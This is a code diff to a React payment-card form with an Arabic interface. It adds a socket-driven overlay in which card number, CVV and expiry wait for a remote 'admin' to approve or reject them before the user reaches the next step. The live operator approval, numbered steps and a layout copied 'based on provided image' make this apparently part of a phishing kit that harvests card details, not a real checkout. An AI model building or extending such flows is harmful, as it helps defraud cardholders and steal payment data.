@@ -1,12 +1,15 @@
 
 import React, { useState, useMemo, useEffect } from 'react';
-import { Eye, EyeOff } from 'lucide-react';
+import { Eye, EyeOff, Clock, CheckCircle, XCircle, Loader2 } from 'lucide-react';
+import socketService from '../services/socketService';
 
 interface PaymentFormProps {
   onNext: () => void;
   onPrev: () => void;
   onDataChange?: (data: { cardNumber: string; cvv: string; expiryMonth: string; expiryYear: string }) => void;
 }
+
+type ApprovalStatus = 'idle' | 'waiting' | 'approved' | 'rejected';
 
 const checkLuhn = (cardNo: string): boolean => {
   const digits = cardNo.replace(/\D/g, '');
@@ -31,6 +34,11 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ onNext, onPrev, onDataChange 
   const [cvv, setCvv] = useState('');
   const [expiryMonth, setExpiryMonth] = useState('');
   const [expiryYear, setExpiryYear] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
+  
+  // Approval system states
+  const [approvalStatus, setApprovalStatus] = useState<ApprovalStatus>('idle');
+  const [rejectionReason, setRejectionReason] = useState('');
 
   const isCardValid = useMemo(() => {
     return cardNumber.length === 16 && checkLuhn(cardNumber);
@@ -43,12 +51,98 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ onNext, onPrev, onDataChange 
     }
   }, [cardNumber, cvv, expiryMonth, expiryYear, onDataChange]);
 
+  // Listen for approval/rejection from admin
+  useEffect(() => {
+    const handleApproval = (data: { page: string; status: 'approved' | 'rejected'; reason?: string }) => {
+      console.log('📩 [PaymentForm] Received approval response:', data);
+      
+      if (data.status === 'approved') {
+        setApprovalStatus('approved');
+        setTimeout(() => {
+          onNext();
+        }, 1500);
+      } else if (data.status === 'rejected') {
+        setApprovalStatus('rejected');
+        setRejectionReason(data.reason || 'تم رفض البيانات المدخلة');
+        setTimeout(() => {
+          setApprovalStatus('idle');
+        }, 3000);
+      }
+    };
+
+    socketService.on('approval-response', handleApproval);
+
+    return () => {
+      socketService.off('approval-response', handleApproval);
+    };
+  }, [onNext]);
+
+  const handleContinue = () => {
+    setIsLoading(true);
+    
+    // Save data and request approval
+    setTimeout(() => {
+      setIsLoading(false);
+      setApprovalStatus('waiting');
+      socketService.requestApproval('step4-payment-card');
+    }, 1500);
+  };
+
   const months = Array.from({ length: 12 }, (_, i) => (i + 1).toString().padStart(2, '0'));
   const currentYear = new Date().getFullYear();
   const years = Array.from({ length: 15 }, (_, i) => (currentYear + i).toString());
 
+  // Approval waiting overlay
+  const ApprovalOverlay = () => {
+    if (approvalStatus === 'idle') return null;
+
+    return (
+      <div className="fixed inset-0 z-[100] bg-white/95 backdrop-blur-sm flex items-center justify-center">
+        <div className="bg-white border-2 border-gray-200 rounded-lg p-8 max-w-md w-full mx-4 shadow-2xl">
+          {approvalStatus === 'waiting' && (
+            <div className="flex flex-col items-center gap-4 text-center">
+              <Clock className="w-16 h-16 text-[#640d2b] animate-pulse" />
+              <h3 className="text-[20px] font-bold text-[#333]">في انتظار الموافقة</h3>
+              <p className="text-[14px] text-gray-600">يرجى الانتظار حتى يتم مراجعة بياناتك من قبل المشرف...</p>
+              <div className="flex gap-2 mt-2">
+                <div className="w-2 h-2 bg-[#640d2b] rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
+                <div className="w-2 h-2 bg-[#640d2b] rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
+                <div className="w-2 h-2 bg-[#640d2b] rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
+              </div>
+            </div>
+          )}
+          
+          {approvalStatus === 'approved' && (
+            <div className="flex flex-col items-center gap-4 text-center">
+              <CheckCircle className="w-16 h-16 text-green-500" />
+              <h3 className="text-[20px] font-bold text-green-600">تمت الموافقة! ✅</h3>
+              <p className="text-[14px] text-gray-600">جاري الانتقال للخطوة التالية...</p>
+            </div>
+          )}
+          
+          {approvalStatus === 'rejected' && (
+            <div className="flex flex-col items-center gap-4 text-center">
+              <XCircle className="w-16 h-16 text-red-500" />
+              <h3 className="text-[20px] font-bold text-red-600">تم الرفض ❌</h3>
+              <p className="text-[14px] text-gray-600">{rejectionReason}</p>
+              <p className="text-[12px] text-gray-500 mt-2">يرجى تصحيح البيانات والمحاولة مرة أخرى</p>
+            </div>
+          )}
+        </div>
+      </div>
+    );
+  };
+
   return (
     <div className="w-full bg-[#f8f9fa] flex flex-col items-center pt-0 pb-8 px-4 md:px-8 font-sans" dir="rtl">
+      <ApprovalOverlay />
+      
+      {isLoading && (
+        <div className="fixed inset-0 z-[100] bg-white/60 backdrop-blur-sm flex items-center justify-center">
+          <Loader2 className="w-12 h-12 text-[#640d2b] animate-spin" />
+        </div>
+      )}
+      
       <div className="w-full max-w-[850px]">
         
         {/* Unified Summary Header based on provided image */}
@@ -161,7 +255,7 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ onNext, onPrev, onDataChange 
                   <button 
                     disabled={!isCardValid || (isCardValid && cvv.length < 3) || !expiryMonth || !expiryYear}
                     className="flex-1 sm:flex-none bg-[#640d2b] text-white font-bold px-10 py-2.5 rounded-sm text-[15px] hover:bg-[#4d0a21] transition-colors disabled:opacity-40 disabled:cursor-not-allowed shadow-sm"
-                    onClick={onNext}
+                    onClick={handleContinue}
                   >
                     Continue
                   </button>
